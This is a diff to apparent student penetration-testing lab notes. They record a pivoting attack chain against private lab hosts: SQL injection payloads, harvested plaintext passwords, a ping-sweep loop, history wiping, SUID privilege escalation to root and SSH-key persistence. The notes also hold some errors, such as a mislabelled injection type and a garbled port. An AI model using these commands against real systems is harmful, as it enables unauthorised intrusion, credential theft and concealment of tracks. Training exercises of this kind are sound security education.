@@ -401,8 +401,7 @@ Data Exfiltration
 
 
 
-
-                               ***********************************************************************************************************************************************************
+***********************************************************************************************************************************************************
                                                       Privilege Escalation, Persistence & Covering Your Tracks
                                                                                 Windows
 DLL hijacking, replace dll already there. HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs
@@ -532,19 +531,35 @@ You will not interfere with other entities' operations in any way.
 Prior Approvals: OSINT through publicly available resources. Scrape appropriate web content that will provide operational data. Testing of found credentials. NOT approved to change routing or destroy data.
 
                                               OPNOTES
+Enumerate with nmap, then with the enumscript, and nc
 10.50.11.158 22 53 80 /login.php, /login.html, /img, /scripts
 
-ssh student@10.50.179.44 -L 1111:10.50.11.158:22 -L 1112:10.50.11.158:53 -L 1113:10.50.11.158:80
-http://127.0.0.1:1113/admin.html >> ' or 1='1 >> 
+ssh student@10.50.179.44 -L 1111:10.50.11.158:22 -L 1112:10.50.11.158:53 -L 1113:10.50.11.158:80       didnt need to do this, could of just went straight into browser
+???try robots.txt
+http://127.0.0.1:1113/admin.html >> ' or 1='1 >> ??this is called command injection
 system_user=user2            user2:x:1002:1003::/home/user2:/bin/sh
 user_password=TurkeyDay24
 found 192.168.28.175 BestWebApp 2222 ssh 8000 html
+we did ssh key generation into the .158
+
+proxychains nmap the .175
 ssh www-data@10.50.11.158 -L 1111:192.168.28.175:2222 -L 1112:192.168.28.175:8000 -D 9050
-http://127.0.0.1:1112/pick.php?product=7 UNION SELECT table_schema,column_name,table_name from information_schema.columns #
-
-
-
-
+??do behavioral analysis, we find SQL query so we can SQL injection
+127.0.0.1:1112/pick.php?product7 OR 1=1         to find vulnerable thing
+http://127.0.0.1:1112/pick.php?product=7 UNION SELECT table_schema,column_name,table_name from information_schema.columns #        the from is all caps, and we dont need the #?
+look for 
+Found Aaron     appleBottomJ3an$
+      user2     TurkeyDay24
+      user3     Bob4THEPin3apples
+      Lee_Roth  Yebgu
+      Lroth     anotherpassword4THEages
+for i in {0..255}; do (ping -c 1 192.168.28.$i | grep "bytes from" &); done     from the bash shell made    found .1, .165, .175
+proxychains the .165
+ssh www-data@10.50.11.158 -L 1111:192.168.28.175:2222 -L 1112:192.168.28.175000 -L 3333:192.168.28.165:22 -D 9050      added the 3333
+logged into user3, >> unset HISTFILE >> do privilege escalation, lookat /etc/passwd, ls -lisa home directories, /etc/hosts, whoami, THIS IS ENUMERATION
+sudo -l, find / -type f -perm /6000 -ls 2>/dev/null, "find" on GTFObins the SUID section use the ./.............., got root prvliges, put ssh key in there
+ping sweep, tunnel to new ip
+xfreerdp?
 
 
 
